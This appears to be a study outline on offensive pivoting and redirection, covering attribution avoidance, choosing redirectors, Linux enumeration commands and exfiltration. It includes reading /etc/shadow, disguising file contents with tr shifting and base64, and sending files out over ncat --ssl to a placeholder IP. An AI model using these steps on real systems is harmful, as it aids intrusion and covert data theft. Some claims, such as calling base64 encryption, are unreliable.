 - Pivoting and Redirection
    - Control sockets
    - Enumeration
    - Exfiltration
    - What is pivoting? Why is it important?
       - Makes the op non attributable
       - Looks like your connection is coming from another location
       - Allows access to something that we may nor hav direct access to due to firewalls, routers, etc.
       - Can make or break an operation,connection loss,malware,active admin,unreliable,etc.
       - Reliability, the pivot machine will be directly accessed, and COULD be attributable 
         if the proper precautions aren’t taken (encryption, VMs, nat and pat)
    - What is a system used for redirection?
       - A remote machine that is very trustworthy and reliable, used to pivot from
    - How much thought should be put into selecting a system for redirection?
       - Geographical Location
       - State of the machine
       - Uptime
       - Basically it’s overall reliability
    - Command demo Linux 
       - cat /etc/passwd
          - username:hashed password:userid:group userid:comments:homedir:default shell
       - cat /etc/shadow
          - contains encrypted user password
       - last
          - displays information about the last user to logon
       - who
          - displays who is currently logged on
       - whoami
          - shows who you are currently logged in as
       - groups
          - displays what groups the user is part of
       - id
          - pulls up uid,guid,and groups for the user who ran the command
       - ps -elf
          - displays current running processes in long format
          - -aux
             - gives us the process tree
       - pstree
          - gives the process listing in a tree format
       - sudo lsof
          - list of open files on the system
       - chkconfig
          - SysV
       - systemctl list-units --type=service
          - SystemD service listings
          - adding a "| grep running" will list only running services
       - ifconfig -a
          - same as ip a but a little bit easier to read
       - netstat
          - list connections to a machine
       - arp -an
          - allows us to view the arp cache
       - ip route
          - gives us our routing table
          - route
             - does the same thing
          - netstat -r
             - does the same thing
       - cat /proc/cpuinfo
          - gives us information about the cpu
       - lsmod
          - lists kernel modules
       - cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
          - shifts the characters in the file and saves it to a different file
       - cat file | base64
          - converts the file to base64 encryption
       - scp <source> <destination>
       - ncat --ssl <ip> <port> < <file>
